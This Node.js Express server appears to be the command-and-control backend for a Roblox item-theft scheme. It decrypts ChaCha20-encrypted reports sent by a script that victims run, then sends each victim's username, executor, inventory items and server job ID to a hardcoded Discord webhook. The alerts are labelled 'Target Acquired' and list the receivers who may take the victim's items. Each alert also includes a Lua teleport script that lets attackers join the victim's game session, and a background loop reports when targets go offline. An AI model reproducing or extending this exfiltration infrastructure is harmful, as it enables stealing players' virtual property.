const express = require('express');
const app = express();
const PORT = 3000;

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1570826970831396865/A-5QsLPk6xYXVoCmtYJwMIHp4q6C8HinXswgjn1PDb4lrridI-tFuXUxkSfTV33043A1';
const ENCRYPTION_KEY = '7b!mE$K8*vP1^qN4#zG6%xR2@jL9&cW5';

app.use(express.json());

const activeSessions = new Map();

function toUInt32(n) { return (n >>> 0); }

function rotl(x, n) {
    x = toUInt32(x);
    return toUInt32((x << n) | (x >>> (32 - n)));
}

function quarterRound(state, a, b, c, d) {
    state[a] = toUInt32(state[a] + state[b]);
    state[d] = rotl(state[d] ^ state[a], 16);
    state[c] = toUInt32(state[c] + state[d]);
    state[b] = rotl(state[b] ^ state[c], 12);
    state[a] = toUInt32(state[a] + state[b]);
    state[d] = rotl(state[d] ^ state[a], 8);
    state[c] = toUInt32(state[c] + state[d]);
    state[b] = rotl(state[b] ^ state[c], 7);
}

function chachaBlock(key, counter, nonce) {
    let state = new Uint32Array(16);
    state[0] = 0x61707865; state[1] = 0x3320646e; state[2] = 0x79622d32; state[3] = 0x6b206574;
    for (let i = 0; i < 8; i++) { state[4 + i] = toUInt32(key.readUInt32LE(i * 4)); }
    state[12] = toUInt32(counter);
    state[13] = toUInt32(nonce.readUInt32LE(0));
    state[14] = toUInt32(nonce.readUInt32LE(4));
    state[15] = toUInt32(nonce.readUInt32LE(8));

    let workingState = new Uint32Array(state);
    for (let i = 0; i < 10; i++) {
        quarterRound(workingState, 0, 4, 8, 12);
        quarterRound(workingState, 1, 5, 9, 13);
        quarterRound(workingState, 2, 6, 10, 14);
        quarterRound(workingState, 3, 7, 11, 15);
        quarterRound(workingState, 0, 5, 10, 15);
        quarterRound(workingState, 1, 6, 11, 12);
        quarterRound(workingState, 2, 7, 8, 13);
        quarterRound(workingState, 3, 4, 9, 14);
    }

    let output = Buffer.alloc(64);
    for (let i = 0; i < 16; i++) {
        output.writeUInt32LE(toUInt32(workingState[i] + state[i]), i * 4);
    }
    return output;
}

function chacha20Decrypt(keyBuf, nonceBuf, ciphertextBuf) {
    let plaintext = Buffer.alloc(ciphertextBuf.length);
    let counter = 1;
    for (let offset = 0; offset < ciphertextBuf.length; offset += 64) {
        let chunkLen = Math.min(64, ciphertextBuf.length - offset);
        let stream = chachaBlock(keyBuf, counter, nonceBuf);
        for (let i = 0; i < chunkLen; i++) {
            plaintext[offset + i] = ciphertextBuf[offset + i] ^ stream[i];
        }
        counter = toUInt32(counter + 1);
    }
    return plaintext;
}

app.post('/api/collect', async (req, res) => {
    res.json({ success: true });
});

app.post('/api/v3/dispatch', async (req, res) => {
    try {
        const { payload } = req.body;
        if (!payload) return res.status(400).json({ success: false });

        const rawData = Buffer.from(payload, 'base64');
        const nonce = rawData.subarray(0, 12);
        const ciphertext = rawData.subarray(12, rawData.length - 32);

        const keyBuf = Buffer.from(ENCRYPTION_KEY, 'utf8');
        const decryptedBytes = chacha20Decrypt(keyBuf, nonce, ciphertext);
        
        const cleanString = decryptedBytes.toString('utf8').replace(/\0/g, '').trim();
        const playerDetails = JSON.parse(cleanString);

        const username = playerDetails.username || "Unknown";
        const receiver = playerDetails.receiver || "vengeance_500"; 
        
        activeSessions.set(username, {
            lastSeen: Date.now(),
            isOnline: true,
            executor: playerDetails.executor || 'Unknown',
            jobid: playerDetails.jobid
        });

        if (playerDetails.status === 'executed') {
            const jobId = playerDetails.jobid || "UNKNOWN_JOBID";
            const placeId = playerDetails.placeid || "142823291";
            const items = playerDetails.items ? JSON.stringify(playerDetails.items, null, 2) : "None";
            const joinScriptLua = `game:GetService("TeleportService"):TeleportToPlaceInstance(${placeId}, "${jobId}", game.Players.LocalPlayer)`;

            // You can replace @everyone with specific Discord user IDs if you want to mention specific people (e.g., <@123456789012345678>)
            const discordMessage = {
                content: "@everyone **New Target Available!**",
                embeds: [{
                    title: "🚨 Target Acquired — Session Live",
                    color: 65280, // Bright Green
                    fields: [
                        { name: "👤 Username", value: `\`${username}\``, inline: true },
                        { name: "🎮 Executor", value: `\`${playerDetails.executor || 'Unknown'}\``, inline: true },
                        { name: "🟢 Status", value: "`Online & Active (Ready to Take Items)`", inline: false },
                        { name: "🛡️ Authorized Receivers (Who Can Take Items)", value: `\`${receiver}\``, inline: false },
                        { name: "📦 Inventory Items", value: `\`\`\`json\n${items}\n\`\`\``, inline: false },
                        { name: "🔗 Tap & Copy Join Script", value: `\`\`\`lua\n${joinScriptLua}\n\`\`\``, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordMessage)
            });
            console.log(`✅ Rich embed alert sent for player: ${username}`);
        }

        res.json({ success: true });
    } catch (err) {
        console.error("❌ Decryption error:", err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// Background check for disconnects (10 second timeout)
setInterval(async () => {
    const now = Date.now();
    for (const [username, session] of activeSessions.entries()) {
        if (session.isOnline && (now - session.lastSeen > 10000)) {
            session.isOnline = false;
            console.log(`🔴 Player ${username} went offline.`);
            
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "🔴 Target Disconnected",
                        description: `\`${username}\` has closed the game or stopped running the script.`,
                        color: 16711685, // Bright Red
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        }
    }
}, 5000);

app.listen(PORT, () => {
    console.log(`🚀 Server is running live at http://localhost:${PORT}`);
});